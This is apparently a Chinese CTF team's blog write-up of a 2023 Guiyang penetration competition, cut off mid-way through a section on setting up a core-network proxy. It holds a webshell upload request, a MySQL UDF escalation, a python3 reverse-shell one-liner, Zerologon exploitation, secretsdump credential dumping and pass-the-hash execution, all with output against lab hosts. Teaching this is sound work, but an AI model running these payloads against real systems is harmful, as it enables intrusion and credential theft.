<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>2023 贵阳大数据网络安全精英对抗赛 SU Writeup - su-team</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="su-team"><meta name="msapplication-TileImage" content="/img/SU4.jpg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="su-team"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="本次比赛分为2天渗透，比赛时间为5月17日和5月18日，我们取得了4th的好成绩，因为很多是赛后复现加上渗透比赛没啥附件，所以有一些内容会有一些差异。"><meta property="og:type" content="blog"><meta property="og:title" content="2023 贵阳大数据网络安全精英对抗赛 SU Writeup"><meta property="og:url" content="https://team-su.github.io/posts/39677.html"><meta property="og:site_name" content="su-team"><meta property="og:description" content="本次比赛分为2天渗透，比赛时间为5月17日和5月18日，我们取得了4th的好成绩，因为很多是赛后复现加上渗透比赛没啥附件，所以有一些内容会有一些差异。"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://team-su.github.io/img/og_image.png"><meta property="article:published_time" content="2023-08-24T05:51:39.000Z"><meta property="article:modified_time" content="2025-07-13T10:34:37.207Z"><meta property="article:author" content="SUers"><meta property="article:tag" content="渗透"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://team-su.github.io/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://team-su.github.io/posts/39677.html"},"headline":"2023 贵阳大数据网络安全精英对抗赛 SU Writeup","image":["https://team-su.github.io/img/og_image.png"],"datePublished":"2023-08-24T05:51:39.000Z","dateModified":"2025-07-13T10:34:37.207Z","author":{"@type":"Person","name":"SUers"},"publisher":{"@type":"Organization","name":"su-team","logo":{"@type":"ImageObject","url":"https://team-su.github.io/img/SU4.jpg"}},"description":"本次比赛分为2天渗透，比赛时间为5月17日和5月18日，我们取得了4th的好成绩，因为很多是赛后复现加上渗透比赛没啥附件，所以有一些内容会有一些差异。"}</script><link rel="canonical" href="https://team-su.github.io/posts/39677.html"><link rel="alternate" href="/atom.xml" title="su-team" type="application/atom+xml"><link rel="icon" href="/img/SU4.jpg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link data-pjax rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link data-pjax rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body class="is-1-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/SU4.jpg" alt="su-team" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a><a class="navbar-item" href="/members">Members</a><a class="navbar-item" href="https://forms.office.com/r/YxbUJJ3i78">Join</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="RSS Feed" href="/atom.xml"><i class="fas fa-rss"></i></a><a class="navbar-item" target="_blank" rel="noopener" title="CTFtime" href="https://ctftime.org/team/29641"><i class="/img/ctftime.svg"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-12"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2023-08-24T05:51:39.000Z" title="2023/8/24 13:51:39">2023-08-24</time></span><span class="level-item">Updated&nbsp;<time dateTime="2025-07-13T10:34:37.207Z" title="2025/7/13 18:34:37">2025-07-13</time></span><span class="level-item">19 minutes read (About 2790 words)</span></div></div><h1 class="title is-3 is-size-4-mobile">2023 贵阳大数据网络安全精英对抗赛 SU Writeup</h1><div class="content"><p>本次比赛分为2天渗透，比赛时间为5月17日和5月18日，我们取得了4th的好成绩，因为很多是赛后复现加上渗透比赛没啥附件，所以有一些内容会有一些差异。</p>
<span id="more"></span>
<hr>
<p>本次比赛分为2天渗透，比赛时间为5月17日和5月18日，我们取得了4th名的好成绩，因为很多是赛后回忆加上渗透比赛没啥附件，所以有一些内容会有一些差异。</p>
<p>本次比赛网络拓扑也很简单，就是直接的3层<br>dmz区（172.30.x.x）-&gt;内网区(192.168.20.x)-&gt;核心内网区(192.168.30.x) ,因为基本上跳板的机子都是双网卡，所以搭建代理和隧道非常简单，不做过多描述，题目质量还是不错的。</p>
<div class="toc">

<!-- toc -->

<ul>
<li><a href="#2023-05-17-day1">2023 05 17 day1</a></li>
<li><a href="#1-dmz-qu">1、DMZ区</a><ul>
<li><a href="#ru-kou-1-172-30-38-150-80-bluecms">入口1：172.30.38.150:80 bluecms</a></li>
<li><a href="#ru-kou-2-172-30-38-151-3306">入口2：172.30.38.151:3306</a></li>
</ul>
</li>
<li><a href="#2-nei-wang-qu">2、内网区</a><ul>
<li><a href="#nei-wang-qu-gitlab-192-168-20-19-8080">内网区gitlab:192.168.20.19:8080</a></li>
<li><a href="#nei-wang-qu-windows-192-168-20-15">内网区windows:192.168.20.15</a></li>
</ul>
</li>
<li><a href="#3-he-xin-nei-wang-qu">3、核心内网区</a><ul>
<li><a href="#da-jian-he-xin-qu-dai-li">搭建核心区代理</a></li>
<li><a href="#laravel-192-168-30-13">Laravel : 192.168.30.13</a></li>
<li><a href="#ftp-192-168-30-19">FTP : 192.168.30.19</a></li>
</ul>
</li>
</ul>
<ul>
<li><a href="#2023-05-18-day2">2023 05 18 day2</a><ul>
<li><a href="#dmz-qu">DMZ区</a><ul>
<li><a href="#tomcat-rce">Tomcat-RCE</a></li>
</ul>
</li>
<li><a href="#nei-wang">内网</a><ul>
<li><a href="#docker-rong-qi">docker容器</a></li>
<li><a href="#sqlserverrce">SqlServerRCE</a></li>
</ul>
</li>
<li><a href="#he-xin-nei-wang">核心内网</a><ul>
<li><a href="#nopac-rce">NoPAC-RCE</a></li>
<li><a href="#hash">hash</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<!-- tocstop -->

</div>

<h2><span id="2023-05-17-day1">2023 05 17 day1</span><a href="#2023-05-17-day1" class="header-anchor"></a></h2><h2><span id="1-dmz-qu">1、DMZ区</span><a href="#1-dmz-qu" class="header-anchor"></a></h2><h3><span id="ru-kou-1-172-30-38-150-80-bluecms">入口1：172.30.38.150:80 bluecms</span><a href="#ru-kou-1-172-30-38-150-80-bluecms" class="header-anchor"></a></h3><p>bluecms后台：<a href="http://172.30.38.150/admin/">http://172.30.38.150/admin/</a><br>账号密码 admin admin666<br>后台系统管理-&gt;模板管理处获编译htm文件，修改为php，burp包如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /admin/tpl_manage.php HTTP/1.1</span><br><span class="line">Host: 172.30.38.150</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 108</span><br><span class="line">Origin: http://172.30.38.150</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://172.30.38.150/admin/tpl_manage.php?act=edit&amp;tpl_name=search.htm</span><br><span class="line">Cookie: PHPSESSID=rkiacm3stpb4c9vpj0cp8cfo67</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">tpl_content=%3C%3Fphp+echo+123%3B%40eval%28%24_POST%5B%27cmd%27%5D%29%3B%3F%3E&amp;tpl_name=../shell.php&amp;act=do_edit</span><br></pre></td></tr></table></figure>
<p>获取权限，蚁剑连接，根目录下有flag.txt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;9130db0c-c67b-4cee-a9a1-a79c34efc079&#125;</span><br></pre></td></tr></table></figure>
<p>同时找&#x2F;var&#x2F;www&#x2F;html&#x2F;data&#x2F;config.php看到了关于数据库账号密码相关信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$dbhost   = &quot;127.0.0.1&quot;; //dmz-db</span><br><span class="line">$dbname   = &quot;bluecms&quot;;</span><br><span class="line">$dbuser   = &quot;root&quot;;</span><br><span class="line">$dbpass   = &quot;root&quot;; // root-gzdb123</span><br></pre></td></tr></table></figure>
<p>但是这里的数据库是本地的，我们第二个靶标与该ip并不是一个，但是既然给了hint，猜测是同一个密码</p>
<h3><span id="ru-kou-2-172-30-38-151-3306">入口2：172.30.38.151:3306</span><a href="#ru-kou-2-172-30-38-151-3306" class="header-anchor"></a></h3><p>根据入口1获取的数据库的密码，连接上了数据库，但是数据库中没有数据，尝试提权，试了几种发现udf可以，在国光师傅的博客 <a href="https://sqlsec.com/udf/">https://sqlsec.com/udf/</a><br>上复制dll的exp下来，然后执行命令获取权限，整体过程如下<br>hex太大 这里缩写为0x4d5a900003….</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">MySQL [(none)]&gt; select @@plugin_dir;</span><br><span class="line">+----------------------------------------------------+</span><br><span class="line">| @@plugin_dir                                       |</span><br><span class="line">+----------------------------------------------------+</span><br><span class="line">| C:\phpstudy_pro\Extensions\MySQL5.7.26\lib\plugin\ |</span><br><span class="line">+----------------------------------------------------+</span><br><span class="line">1 row in set (0.003 sec)</span><br><span class="line"></span><br><span class="line">MySQL [(none)]&gt; SELECT 0x4d5a900003 INTO DUMPFILE &#x27;C:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\\plugin\\udf.dll&#x27;;</span><br><span class="line">MySQL [(none)]&gt; create function sys_eval returns string soname &#x27;udf.dll&#x27;;</span><br><span class="line">MySQL [(none)]&gt; select sys_eval(&quot;whoami&quot;);</span><br><span class="line">+---------------------+</span><br><span class="line">| sys_eval(&quot;whoami&quot;)  |</span><br><span class="line">+---------------------+</span><br><span class="line">| nt authority\system |</span><br><span class="line">+---------------------+</span><br><span class="line">1 row in set (0.042 sec)</span><br><span class="line">然后一步步翻flag</span><br><span class="line">MySQL [(none)]&gt; select sys_eval(&#x27;type C:\\users\\Administrator\\Desktop\\flag.txt&#x27;);</span><br><span class="line">+--------------------------------------------------------------+</span><br><span class="line">| sys_eval(&#x27;type C:\\users\\Administrator\\Desktop\\flag.txt&#x27;) |</span><br><span class="line">+--------------------------------------------------------------+</span><br><span class="line">| flag&#123;522a6ec2-b101-4bae-b2fd-3e0582096a37                    |</span><br><span class="line">+--------------------------------------------------------------+</span><br><span class="line">1 row in set (0.030 sec)</span><br></pre></td></tr></table></figure>

<h2><span id="2-nei-wang-qu">2、内网区</span><a href="#2-nei-wang-qu" class="header-anchor"></a></h2><p>DMZ区拿下了一台linux 一台windows ，选择用linux挂代理</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">linux:</span><br><span class="line">./gost -L=socks5://:7777</span><br><span class="line">./gost -L rtcp://0.0.0.0:8888/localhost:7777 -F forward+ssh://admin:123456@172.30.38.201:9898?ping=30</span><br><span class="line"></span><br><span class="line">本地：</span><br><span class="line">gost-windows-amd64.exe -L forward+ssh://admin:123456@:9898</span><br><span class="line">本地的8888就是内网区的代理了</span><br></pre></td></tr></table></figure>
<h3><span id="nei-wang-qu-gitlab-192-168-20-19-8080">内网区gitlab:192.168.20.19:8080</span><a href="#nei-wang-qu-gitlab-192-168-20-19-8080" class="header-anchor"></a></h3><p>先fscan扫描<br><code>./fscan -h 192.168.0.0/16</code><br>网络有点卡，等了一会发现除了DMZ区外只有一个内网服务器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">192.168.20.19:8080 open</span><br><span class="line">192.168.20.19:22 open</span><br><span class="line">[*] WebTitle:http://192.168.20.19:8080 code:302 len:105    title:None</span><br><span class="line">[*] WebTitle:http://192.168.20.19:8080/users/sign_in code:200 len:17     title:Sign in · GitLab</span><br><span class="line">[+] InfoScan:http://192.168.20.19:8080/users/sign_in [GitLab] </span><br><span class="line">[+] http://192.168.20.19:8080 poc-yaml-gitlab-cnvd-2021-14193-infoleak</span><br></pre></td></tr></table></figure>
<p>网站找gitlab前台rce漏洞，分析了一下，cve-2021-22205可用，github找一个exp打，这里很蛋疼，这个poc是无回显的，而且gitlab不太方便做权限维持（不是php写的），尝试反弹shell，但是内网区是不通本地的ip，只有DMZ区通。<br>所以我使用的方法是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、先将dmz区的linux反弹shell到本地获取一个交互式dmz区的shell</span><br><span class="line">这个dmz区反弹一直报错，最后使用python3反弹的</span><br><span class="line">python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.10.10&quot;,9090));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span><br><span class="line">2、在交互式dmz区的shell上 监听nc -lnvp 9090</span><br><span class="line">3、用gitlab的exp 反弹shell到dmz的ip（192.168.10.10）</span><br></pre></td></tr></table></figure>

<p>获取了git的权限，flag在根目录 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git@60783d084846:~/gitlab$ cat /flag.txt</span><br><span class="line">flag&#123;b10785ca-a4ff-4cb9-a6d5-50351c248ee3&#125;</span><br></pre></td></tr></table></figure>
<h3><span id="nei-wang-qu-windows-192-168-20-15">内网区windows:192.168.20.15</span><a href="#nei-wang-qu-windows-192-168-20-15" class="header-anchor"></a></h3><p>fscan开多了，所以没扫到其他资产，试了很久。然后把fscan进程一个个杀了，降低线程+重新跑了一下20+取消ping。<br>发现了另外一个资产</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192.168</span><span class="number">.20</span><span class="number">.19</span>:<span class="number">22</span> <span class="built_in">open</span></span><br><span class="line"><span class="number">192.168</span><span class="number">.20</span><span class="number">.15</span>:<span class="number">135</span> <span class="built_in">open</span></span><br><span class="line"><span class="number">192.168</span><span class="number">.20</span><span class="number">.15</span>:<span class="number">139</span> <span class="built_in">open</span></span><br><span class="line"><span class="number">192.168</span><span class="number">.20</span><span class="number">.15</span>:<span class="number">445</span> <span class="built_in">open</span></span><br><span class="line"><span class="number">192.168</span><span class="number">.20</span><span class="number">.19</span>:<span class="number">8080</span> <span class="built_in">open</span></span><br><span class="line"><span class="number">192.168</span><span class="number">.20</span><span class="number">.15</span>:<span class="number">88</span> <span class="built_in">open</span></span><br><span class="line">NetInfo:</span><br><span class="line">[*]<span class="number">192.168</span><span class="number">.20</span><span class="number">.15</span></span><br><span class="line">   [-&gt;]DC</span><br><span class="line">   [-&gt;]<span class="number">192.168</span><span class="number">.20</span><span class="number">.15</span></span><br><span class="line">[*] <span class="number">192.168</span><span class="number">.20</span><span class="number">.15</span>  (Windows Server <span class="number">2012</span> R2 Datacenter <span class="number">9600</span>)</span><br><span class="line">[*] <span class="number">192.168</span><span class="number">.20</span><span class="number">.15</span>  [+]DC COMPANY\DC                Windows Server <span class="number">2012</span> R2 Datacenter <span class="number">9600</span></span><br><span class="line">[*] WebTitle:http://<span class="number">192.168</span><span class="number">.20</span><span class="number">.19</span>:<span class="number">8080</span> code:<span class="number">302</span> <span class="built_in">len</span>:<span class="number">105</span>    title:<span class="literal">None</span></span><br><span class="line">[*] WebTitle:http://<span class="number">192.168</span><span class="number">.20</span><span class="number">.19</span>:<span class="number">8080</span>/users/sign_in code:<span class="number">200</span> <span class="built_in">len</span>:<span class="number">17</span>     title:Sign <span class="keyword">in</span> · GitLab</span><br><span class="line">[+] InfoScan:http://<span class="number">192.168</span><span class="number">.20</span><span class="number">.19</span>:<span class="number">8080</span>/users/sign_in [GitLab] </span><br><span class="line">[+] http://<span class="number">192.168</span><span class="number">.20</span><span class="number">.19</span>:<span class="number">8080</span> poc-yaml-gitlab-cnvd-<span class="number">2021</span>-<span class="number">14193</span>-infoleak</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>192.168.20.15是一台裸DC<br>发现存在Zerologon经典漏洞，CVE-2020-1472<br>先挂上192.168.10.10上的代理，github找一个exp,对着网站复现。<br>拿到hash用kali的impacket组件，然后用wmiexec命令执行获取flag,所有过程如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 cve-2020-1472-exploit.py DC 192.168.20.15                                 1 ⨯</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.14</span><br><span class="line">Performing authentication attempts...</span><br><span class="line">[proxychains] Strict chain  ...  172.30.38.201:8888  ...  192.168.20.15:135  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  172.30.38.201:8888  ...  192.168.20.15:49158  ...  OK</span><br><span class="line">==================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================</span><br><span class="line">Target vulnerable, changing account password to empty string</span><br><span class="line"></span><br><span class="line">Result: 0</span><br><span class="line"></span><br><span class="line">Exploit complete!</span><br><span class="line"></span><br><span class="line">─$ proxychains4 python3 secretsdump.py  -hashes :31d6cfe0d16ae931b73c59d7e0c089c0  &quot;company.local/DC\$@192.168.20.15&quot;  2 ⨯</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.14</span><br><span class="line">Impacket v0.10.1.dev1 - Copyright 2022 Fortra</span><br><span class="line"></span><br><span class="line">[proxychains] Strict chain  ...  172.30.38.201:8888  ...  192.168.20.15:445  ...  OK</span><br><span class="line">[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied </span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">[proxychains] Strict chain  ...  172.30.38.201:8888  ...  192.168.20.15:135  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  172.30.38.201:8888  ...  192.168.20.15:49155  ...  OK</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:c1cd39bfd103a65a50fe6c7199dab799:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:51103e514e91e837821f6c70b2fcbf3a:::</span><br><span class="line">DC$:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">krbtgt:aes256-cts-hmac-sha1-96:245e5824adfc248572451cb966eb44fea409149e70713f0b8400069732580b47</span><br><span class="line">krbtgt:aes128-cts-hmac-sha1-96:21fba0c76db699fb80c59730a1bb467c</span><br><span class="line">krbtgt:des-cbc-md5:dace764645ea2646</span><br><span class="line">DC$:aes256-cts-hmac-sha1-96:34c8b93f22c8c95d6c07a1a2bf35dcfae048091233406be6e16f89cdc1865db8</span><br><span class="line">DC$:aes128-cts-hmac-sha1-96:4c0c9af9f667ba964235c2d27b99e3c3</span><br><span class="line">DC$:des-cbc-md5:43d519a4f22ca2a7</span><br><span class="line">[*] Cleaning up... </span><br><span class="line"></span><br><span class="line">└─$ proxychains4 python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:c1cd39bfd103a65a50fe6c7199dab799 company.local/Administrator@192.168.20.15</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.14</span><br><span class="line">Impacket v0.10.1.dev1 - Copyright 2022 Fortra</span><br><span class="line"></span><br><span class="line">[proxychains] Strict chain  ...  172.30.38.201:8888  ...  192.168.20.15:445  ...  OK</span><br><span class="line">[*] SMBv3.0 dialect used</span><br><span class="line">[proxychains] Strict chain  ...  172.30.38.201:8888  ...  192.168.20.15:135  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  172.30.38.201:8888  ...  192.168.20.15:49154  ...  OK</span><br><span class="line">[!] Launching semi-interactive shell - Careful what you execute</span><br><span class="line">[!] Press help for extra shell commands</span><br><span class="line">C:\&gt;type C:\Users\Administrator\Desktop\flag.txt</span><br><span class="line">flag&#123;bcbdb15f-fad8-4f18-b9d5-c5ff397bf275&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2><span id="3-he-xin-nei-wang-qu">3、核心内网区</span><a href="#3-he-xin-nei-wang-qu" class="header-anchor"></a></h2><p>总结前面的信息，在内网区的gitlab上跑fscan，获取扫描核心内网的资产</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">git@60783d084846:/tmp/fscan$ ./f -np -h 192.168.30.0/24 -o 30.txt</span><br><span class="line">./f -np -h 192.168.30.0/24 -o 30.txt</span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.6.3</span><br><span class="line">start infoscan</span><br><span class="line">192.168.30.19:21 open</span><br><span class="line">192.168.30.13:80 open</span><br><span class="line">192.168.30.13:22 open</span><br><span class="line">192.168.30.19:22 open</span><br><span class="line"></span><br><span class="line">alive ports len is: 4</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle:http://192.168.30.13      code:200 len:7      title:Laravel</span><br><span class="line">[+] InfoScan:http://192.168.30.13      [Laravel] </span><br><span class="line">已完成 1/4 [-] ssh 192.168.30.19:22 root root@2019 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain</span><br><span class="line">已完成 3/4 [-] ftp://192.168.30.19:21 www Passw0rd 530 Login incorrect.</span><br></pre></td></tr></table></figure>
<p>开了一个web服务器192.168.30.13 是laravel<br>一个ftp 192.168.30.19是一个ftp。</p>
<h3><span id="da-jian-he-xin-qu-dai-li">搭建核心区代理</span><a href="#da-jian-he-xin-qu-dai-li" class="header-anchor"></a></h3><p>因为每一层都是单通道，这里尝试把核心区代理到本地，方便对laravel进行渗透，其实这里只要把第二层内网区的网络代理到本地就可以到第三层<br>搭建代理逻辑如下<br>1、在第一层DMZ区的192.168.10.10上搭建一个服务器端</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./gost -L forward+ssh://admin:123456@:17979</span><br></pre></td></tr></table></figure>
<p>2、在第二层内网区服务器上起动客户端，让第二层的网络环境到达第一层。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./gost -L=socks5://:7777</span><br><span class="line">./gost -L rtcp://0.0.0.0:7979/localhost:7777 -F forward+ssh://admin:123456@192.168.10.10:17979?ping=30</span><br></pre></td></tr></table></figure>
<p>此时在192.168.10.10上执行curl -x socks5:&#x2F;&#x2F;localhost:17979 192.168.30.13 访问正常即可。<br>结合第一层的代理，然后两层代理一起使用代理链的功能，本地就直接通30了，配置如下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:8888</span><br><span class="line">localhost:7979</span><br></pre></td></tr></table></figure>
<p>本地规则为 192.168.30.0&#x2F;24 走proxychains</p>
